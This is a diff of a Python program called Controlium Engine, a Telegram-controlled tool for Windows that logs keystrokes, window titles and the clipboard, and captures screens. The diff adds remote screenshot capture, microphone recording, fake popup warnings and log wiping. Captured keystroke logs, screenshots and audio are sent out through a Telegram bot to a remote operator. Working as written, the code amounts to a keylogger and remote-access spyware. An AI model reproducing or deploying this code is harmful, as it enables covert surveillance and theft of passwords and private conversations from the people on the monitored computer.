@@ -18,45 +18,43 @@ import webbrowser
 import pyttsx3
 import pygetwindow as gw
 from pynput import keyboard
+from tkinter import messagebox
 from plyer import notification
+import sounddevice as sd
+import screen_brightness_control as scrn
+from scipy.io.wavfile import write
 
+
+BOT_TOKEN = "YOUR BOT TOKEN"
 
 def telegram_alert(send):
-    bot_token = "BOT TOKEN"
+    bot_token = BOT_TOKEN
     my_chatID = "CHAT ID"
     send_text = "https://api.telegram.org/bot" + bot_token + "/sendMessage?chat_id=" + my_chatID + "&parse_mode=Markdown&text=" + send
 
     response = requests.get(send_text)
     return response.json()
 
-def win_notification(message):
-    msg = message.text
-    notification.notify(
-        title="Windows Notification",
-        message=msg,
-        app_icon=None,
-        timeout=5,)
-    
 incognito = False
 
-bot = telebot.TeleBot("BOT TOKEN")
+bot = telebot.TeleBot(BOT_TOKEN)
 @bot.message_handler(func=lambda message: True)
 
-def command_engine(message):
+def command_unit(message):
     global incognito
 
     try:
-        if message.text.lower() == "stop":
+        if message.text.lower() == "/stop":
             notification.notify(
-                title="Windows Notification",
-                message="Control program terminated",
-                app_icon=None,
+                title="Windows notification",
+                message="Controlium engine shutdown",
+                app_icon="appLogo.ico",
                 timeout=3,)
             
             bot.reply_to(message, "Engine shutdown")
             subprocess.run(["taskkill", "/F", "/PID", str(pid)])
 
-        elif message.text.lower() == "log":
+        elif message.text.lower() == "/log":
             try:
                 with open(save_log_file, 'rb') as file:
                     bot.send_document(message.chat.id, file)
@@ -64,7 +62,7 @@ def command_engine(message):
             except Exception as e:
                 bot.reply_to(message, f"Error sending file: {e}")
 
-        elif message.text.lower() == "keylog":
+        elif message.text.lower() == "/keylog":
             try:
                 with open(key_log_file, 'rb') as file:
                     bot.send_document(message.chat.id, file)
@@ -72,97 +70,181 @@ def command_engine(message):
             except Exception as e:
                 bot.reply_to(message, f"Error sending file: {e}")
 
-        elif message.text.lower() == "notepad":
+        elif message.text.lower() == "/sslog":
+            try:
+                with open("controlium-ss.jpg", 'rb') as file:
+                    bot.send_document(message.chat.id, file)
+
+            except Exception as e:
+                bot.reply_to(message, f"Error sending file: {e}")
+
+        elif message.text.lower() == "/notepad":
             os.startfile(f"C:/Users/{username}/AppData/Local/Microsoft/WindowsApps/notepad.exe")
             bot.reply_to(message, "Opened Notepad")
 
-        elif message.text.lower() == "chrome":
+        elif message.text.lower() == "/chrome":
             os.startfile("C:\Program Files\Google\Chrome\Application\chrome.exe")
             bot.reply_to(message, "Opened Chrome")
 
-        elif message.text.lower() == "vscode":
+        elif message.text.lower() == "/vscode":
             os.startfile(f"C:/Users/{username}/AppData/Local/Programs/Microsoft VS Code/Code.exe")
             bot.reply_to(message, "Opened Visual Studio Code")
 
-        elif message.text.lower() == "word":
+        elif message.text.lower() == "/word":
             os.startfile("C:/Program Files/Microsoft Office/root\Office16/WINWORD.EXE")
             bot.reply_to(message, "Opened Microsoft Word")
 
-        elif message.text.lower() == "powerpoint":
+        elif message.text.lower() == "/powerpoint":
             os.startfile("C:/Program Files/Microsoft Office/root/Office16/POWERPNT.EXE")
             bot.reply_to(message, "Opened PowerPoint")
 
-        elif message.text.lower() == "excel":
+        elif message.text.lower() == "/excel":
             os.startfile("C:/Program Files/Microsoft Office/root/Office16/EXCEL.EXE")
             bot.reply_to(message, "Opened Microsoft Excel")
 
-        elif message.text.lower() == "edge":
+        elif message.text.lower() == "/edge":
             os.startfile("C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
             bot.reply_to(message, "Opened Microsoft Edge")
 
-        elif message.text.lower() == "files":
+        elif message.text.lower() == "/files":
             os.startfile("C:/Windows/explorer.exe")
             bot.reply_to(message, "Opened File Explorer")
 
-        elif message.text.lower() == "alert":
+        elif message.text.lower() == "/alert":
             bot.reply_to(message, "Enter messeage")
+
+            def win_notification(message):
+                msg = message.text
+                notification.notify(
+                    title="Windows notification",
+                    message=msg,
+                    app_icon="appLogo.ico",
+                    timeout=5,)
+                bot.reply_to(message, "Done")
+    
             bot.register_next_step_handler(message, win_notification)
-            bot.reply_to(message, "Done")
 
-        elif message.text.lower() == "bg":
-            img_path = "C:/Users/ashfa/OneDrive/Documents/Projects/Controlium Engine (PY12824)/Images/test4.jpg"
-            #ctypes.windll.user32.SystemParametersInfoW(20, 0, "test2.jpg", 0)
-            bot.reply_to(message, "Changed wallpaper")
+        elif message.text.lower() == "/popup":
+            bot.reply_to(message, "Enter messeage")
 
-        elif message.text.lower() == "sound1":
+            def popup(message):
+                msg = message.text
+                messagebox.showwarning("Windows", msg)
+                bot.reply_to(message, "Done")
+                
+            bot.register_next_step_handler(message, popup)
+
+        elif message.text.lower() == "/ss":
+            screenshot = pyautogui.screenshot()
+            screenshot.save("controlium-ss.jpg")
+            bot.reply_to(message, "Screenshot taken")
+
+            try:
+                with open("controlium-ss.jpg", 'rb') as file:
+                    bot.send_document(message.chat.id, file)
+
+            except Exception as e:
+                bot.reply_to(message, f"Error sending file: {e}")
+
+        elif message.text.lower() == "/record":
+            bot.reply_to(message, "Audio recording...")
+
+            frequency = 44100
+            duration = 10
+            record_audio = sd.rec(int(duration * frequency), samplerate=frequency, channels=2)
+            sd.wait()
+            write("Audio/controlium-rec.wav", frequency, record_audio)
+            bot.reply_to(message, "Audio recorded")
+
+            try:
+                with open("Audio/controlium-rec.wav", 'rb') as file:
+                    bot.send_document(message.chat.id, file)
+
+            except Exception as e:
+                bot.reply_to(message, f"Error sending file: {e}")
+
+        elif message.text.lower() == "/nobg":
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, "", 3)
+            bot.reply_to(message, "Removed wallpaper")
+
+        elif "audio" in message.text.lower():
+            audio_num = message.text.split()[1]
             pygame.mixer.init()
-            pygame.mixer.music.load("Sounds/sound1.mp3")
-            pygame.mixer.music.play(-1)
-            bot.reply_to(message, "Playing sound")
+            pygame.mixer.music.load(f"Audio/audio{audio_num}.mp3")
+            pygame.mixer.music.play(0)
+            bot.reply_to(message, f"Playing audio {audio_num}")
 
-        elif message.text.lower() == "sound2":
-            pygame.mixer.init()
-            pygame.mixer.music.load("Sounds/sound2.mp3")
-            pygame.mixer.music.play(-1)
-            bot.reply_to(message, "Playing sound")
-
-        elif message.text.lower() == "sound3":
-            pygame.mixer.init()
-            pygame.mixer.music.load("Sounds/sound3.mp3")
-            pygame.mixer.music.play(-1)
-            bot.reply_to(message, "Playing sound")
-
-        elif message.text.lower() == "sound stop":
+        elif message.text.lower() == "/mute":
             pygame.mixer.music.stop()
-            bot.reply_to(message, "Sound stopped")
+            bot.reply_to(message, "Audio stopped")
 
-        elif message.text.lower() == "close all":
-            active_window = gw.getActiveWindow()
-            active_window.close()
+        elif "volup" in message.text.lower():
+            vol = message.text.split()[1]
+            vol_level = int(vol)
+
+            for v in range(vol_level):
+                pyautogui.press('volumeup')
+
+            bot.reply_to(message, f"Volume increased by {vol_level}")
+
+        elif "voldown" in message.text.lower():
+            vol = message.text.split()[1]
+            vol_level = int(vol)
+
+            for v in range(vol_level):
+                pyautogui.press('volumedown')
+
+            bot.reply_to(message, f"Volume decreased by {vol_level}")
+
+        elif "brightness" in message.text.lower():
+            brightness = message.text.split()[1]
+            brightness_lvl = int(brightness)
+
+            scrn.set_brightness(brightness_lvl)
+
+            bot.reply_to(message, f"Screen brightness: {brightness_lvl}%")
+
+        elif message.text.lower() == "/getfocus":
+            focus_window = gw.getActiveWindow()
+            bot.reply_to(message, f"Window in focus: {focus_window.title}")
+
+        elif message.text.lower() == "/getallwin":
+            open_windows = gw.getWindowsWithTitle("")
+            for window in open_windows:
+                telegram_alert(window.title)
+
+        elif message.text.lower() == "/closefocus":
+            focus_window = gw.getActiveWindow()
+            if focus_window is not None:
+                focus_window.close()
+
+            bot.reply_to(message, f"Closed {focus_window.title}")
+
+        elif message.text.lower() == "/closeall":
+            open_win = gw.getAllWindows()
+            for window in open_win:
+                window.close()
+
             bot.reply_to(message, "Closed all windows")
 
-        elif message.text.lower() == "close focus":
-            pyautogui.hotkey('ctrl', 'alt', 'down')
-            bot.reply_to(message, "Closed window in focus")
-
-        elif message.text.lower() == "enter":
+        elif message.text.lower() == "/enter":
             pyautogui.hotkey('enter')
             bot.reply_to(message, "Done")
 
-        elif message.text.lower() == "undo":
+        elif message.text.lower() == "/undo":
             pyautogui.hotkey('ctrl', 'z')
             bot.reply_to(message, "Done")
 
-        elif message.text.lower() == "copy":
+        elif message.text.lower() == "/copy":
             pyautogui.hotkey('ctrl', 'c')
             bot.reply_to(message, "Done")
 
-        elif message.text.lower() == "paste":
+        elif message.text.lower() == "/paste":
             pyautogui.hotkey('ctrl', 'v')
             bot.reply_to(message, "Done")
 
-        elif message.text.lower() == "select all":
-            pyautogui.hotkey('ctrl', 'a')
+        elif message.text.lower() == "/delete":
+            pyautogui.hotkey('delete')
             bot.reply_to(message, "Done")
 
         elif "#" in message.text.lower():
@@ -170,53 +252,33 @@ def command_engine(message):
             pyautogui.typewrite(user_chars)
             bot.reply_to(message, "Done")
 
-        elif message.text.lower() == "close chrome":
-            os.system("taskkill /f /im chrome.exe")
-            bot.reply_to(message, "Closed Chrome")
-
-        elif message.text.lower() == "close excel":
-            os.system("taskkill /f /im excel.exe")
-            bot.reply_to(message, "Closed Microsoft Excel")
-
-        elif message.text.lower() == "close word":
-            os.system("taskkill /f /im winword.exe")
-            bot.reply_to(message, "Closed Microsoft Word")
-
-        elif message.text.lower() == "close powerpoint":
-            os.system("taskkill /f /im POWERPNT.EXE")
-            bot.reply_to(message, "Closed PowerPoint")
-
-        elif message.text.lower() == "close vscode":
-            os.system("taskkill /f /im Code.exe")
-            bot.reply_to(message, "Closed VScode")
-
-        elif message.text.lower() == "sign out":
+        elif message.text.lower() == "/signout":
             subprocess.call(["shutdown", "/l"])
             bot.reply_to(message, "System sign out")
 
-        elif message.text.lower() == "hibernate":
+        elif message.text.lower() == "/hibernate":
             os.system("shutdown /h")
             bot.reply_to(message, "System hibernation")
 
-        elif message.text.lower() == "shutdown":
+        elif message.text.lower() == "/shutdown":
             os.system("shutdown /s /t 30")
             bot.reply_to(message, "System shutdown")
 
-        elif message.text.lower() == "clear bin":
+        elif message.text.lower() == "/bin":
             winshell.recycle_bin().empty(confirm=False, show_progress=True, sound=True)
             bot.reply_to(message, "Recycle bin cleared")
 
-        elif message.text.lower() == "incog":
+        elif message.text.lower() == "/incognito":
             incognito = True
             bot.reply_to(message, "Incognito mode enabled")
 
-        elif message.text.lower() == "dis incog":
+        elif message.text.lower() == "/incogoff":
             incognito = False
             bot.reply_to(message, "Incognito mode disabled")
 
-        elif message.text.lower() == "clear logs":
+        elif message.text.lower() == "/clearlogs":
             try:
-                act_log = "Activity Logs"
+                act_log = "Activity"
                 txtfiles = [f for f in os.listdir(act_log) if f.endswith(".txt")]
 
                 for f in txtfiles:
@@ -226,12 +288,25 @@ def command_engine(message):
             except Exception as e:
                 bot.reply_to(message, "Deleted activity logs")
                 bot.reply_to(message, f"ERROR >> {e}")
-        
+
+            key_log = "Keystroke"
+            txtfiles2 = [f for f in os.listdir(key_log) if f.endswith(".txt")]
+
+            for f in txtfiles2:
+                os.remove(os.path.join(key_log, f))
+            bot.reply_to(message, "Deleted keystroke logs")
+
+            os.remove("controlium-ss.jpg")
+            bot.reply_to(message, "Deleted screenshot")
+
+            os.remove("Audio/controlium-rec.wav")
+            bot.reply_to(message, "Deleted audio file")
+
         elif "clean" in message.text.lower():
             month = message.text.split()[1].capitalize()
             
             try:
-                act_log = "Activity Logs"
+                act_log = "Activity"
                 txtfiles = [f for f in os.listdir(act_log) if f.endswith(".txt") and f.startswith(month)]
 
                 for f in txtfiles:
@@ -241,20 +316,12 @@ def command_engine(message):
             except Exception as e:
                 bot.reply_to(message, f"ERROR >> {e}")
 
-        elif message.text.lower() == "clear keylogs":
-            key_log = "Keystroke Logs"
-            txtfiles2 = [f for f in os.listdir(key_log) if f.endswith(".txt")]
-
-            for f in txtfiles2:
-                os.remove(os.path.join(key_log, f))
-            bot.reply_to(message, "Deleted keystroke logs")
-
         elif ">" in message.text.lower():
             usr_msg = message.text
             speech_engine(usr_msg)
             bot.reply_to(message, "Done")
 
-        elif message.text.lower() == "time":
+        elif message.text.lower() == "/time":
             time = datetime.datetime.now().strftime("%H:%M")
             speech_engine(f"The time is {time}")
             bot.reply_to(message, "Done")
@@ -265,6 +332,9 @@ def command_engine(message):
             query = ' '.join([str(item) for item in conv])
             webbrowser.open(f"https://www.google.com/search?q={query}")
             bot.reply_to(message, f"Searching {query}")
+
+        elif message.text.lower() == "/version":
+            bot.reply_to(message, "Controlium Engine v1.6.0")
 
         else:
             bot.reply_to(message, "Invalid command")
@@ -287,28 +357,29 @@ uptime = datetime.datetime.fromtimestamp(boot_time)
 pid = os.getpid()
 
 
-folder1 = os.path.exists("Activity Logs")
+folder1 = os.path.exists("Activity")
 if folder1 == False:
-    os.mkdir("Activity Logs")
-folder2 = os.path.exists("Keystroke Logs")
+    os.mkdir("Activity")
+
+folder2 = os.path.exists("Keystroke")
 if folder2 == False:
-    os.mkdir("Keystroke Logs")
+    os.mkdir("Keystroke")
 
 date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
-log_file = str(date).replace(":", "-") + "-Log.txt"
-folder = "Activity Logs"
+log_file = str(date).replace(":", "-") + "-log.txt"
+folder = "Activity"
 save_log_file = os.path.join(folder, log_file)
 
 date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
-log_file = str(date).replace(":", "-") + "-key-log.txt"
-folder = "Keystroke Logs"
+log_file = str(date).replace(":", "-") + "-keylog.txt"
+folder = "Keystroke"
 key_log_file = os.path.join(folder, log_file)
 
 logging.basicConfig(filename=save_log_file, level=logging.INFO, format='%(asctime)s - %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
 logged_windows = set()
 
 
-def log_windows():
+def windows_logger():
     try:
         global logged_windows
         open_windows = gw.getWindowsWithTitle("")
@@ -341,18 +412,16 @@ def key_press(key):
         except AttributeError:
             with open(key_log_file, "a") as f:
                 f.write(f"Key pressed: {key}\n")
-        if key == keyboard.Key.print_screen:
-            logging.info("Screenshot taken")
 
 def key_release(key):
     if key == keyboard.Key.esc:
         return False
     
 
-def log_keystrokes():
+def keystroke_logger():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
     with open(key_log_file, "a") as f:
-        f.write(f'''CONTROLIUM ENGINE v1.5.2
+        f.write(f'''CONTROLIUM ENGINE v1.6.0
 {str(time_stamp)}
 << KEYSTROKE LOG >>
 
@@ -370,9 +439,9 @@ def log_keystrokes():
         watcher.join()
 
 
-def log_activity():
+def activity_logger():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
-    logging.info(f'''CONTROLIUM ENGINE v1.5.2
+    logging.info(f'''CONTROLIUM ENGINE v1.6.0
 {str(time_stamp)}
 << ACTIVITY LOG >>
 
@@ -387,7 +456,11 @@ def log_activity():
 ''')
     while True:
         if incognito != True:
-            log_windows()
+            windows_logger()
+        
+            time.sleep(5)
+            screenshot = pyautogui.screenshot()
+            screenshot.save("controlium-ss.jpg")
 
 
 def network_connection():
@@ -415,26 +488,19 @@ def clipboard_activity():
 def clear_logs():
     while True:
         try:
-            act_log = "Activity Logs"
+            act_log = "Activity"
             txtfiles = [f for f in os.listdir(act_log) if f.endswith(".txt")]
 
-            time.sleep(5)
+            time.sleep(600)
             for f in txtfiles:
                 os.remove(os.path.join(act_log, f))
         except:
             pass
 
-def clear_keystrokes():
-    while True:
-        try:
-            key_log = "Keystroke Logs"
-            txtfiles2 = [f for f in os.listdir(key_log) if f.endswith(".txt")]
-
-            time.sleep(5)
-            for f in txtfiles2:
-                os.remove(os.path.join(key_log, f))
-        except:
-            pass
+        key_log = "Keystroke"
+        txtfiles2 = [f for f in os.listdir(key_log) if f.endswith(".txt")]
+        for f in txtfiles2:
+            os.remove(os.path.join(key_log, f))
 
 
 def telegram_bot():
@@ -457,20 +523,18 @@ def speech_engine(speak):
 ##########################################################################################
 
 if __name__ == "__main__":
-    keystroke_thread = threading.Thread(target=log_keystrokes)
-    activity_thread = threading.Thread(target=log_activity)
-    network_thread = threading.Thread(target=network_connection)
-    clipboard_thread = threading.Thread(target=clipboard_activity)
-    clear_logs_thread = threading.Thread(target=clear_logs)
-    clear_keystrokes_thread = threading.Thread(target=clear_keystrokes)
-    telegram_bot_thread = threading.Thread(target=telegram_bot)
+    keystroke_thread = threading.Thread(target=keystroke_logger) # Thread 1
+    activity_thread = threading.Thread(target=activity_logger) # Thread 2
+    network_thread = threading.Thread(target=network_connection) # Thread 3
+    clipboard_thread = threading.Thread(target=clipboard_activity) # Thread 4
+    clear_logs_thread = threading.Thread(target=clear_logs) # Thread 5
+    telegram_bot_thread = threading.Thread(target=telegram_bot) # Thread 6
 
     keystroke_thread.start()
     activity_thread.start()
     network_thread.start()
-    clipboard_thread.start()
+    clipboard_thread.start()  
     clear_logs_thread.start()
-    clear_keystrokes_thread.start()
     telegram_bot_thread.start()
 
     keystroke_thread.join()
@@ -478,7 +542,6 @@ if __name__ == "__main__":
     network_thread.join()
     clipboard_thread.join()
     clear_logs_thread.join()
-    clear_keystrokes_thread.join()
     telegram_bot_thread.join()
 
 
@@ -487,7 +550,8 @@ if __name__ == "__main__":
 
 
 # MIT License
-# Copyright (c) 2024 Ashfaaq Rifath - Controlium Engine v1.5.2
+# Copyright (c) 2024 Ashfaaq Rifath - Controlium Engine v1.6.0
 # All rights reserved.
 
+# T6 Engine
 # USE WITH CAUSION
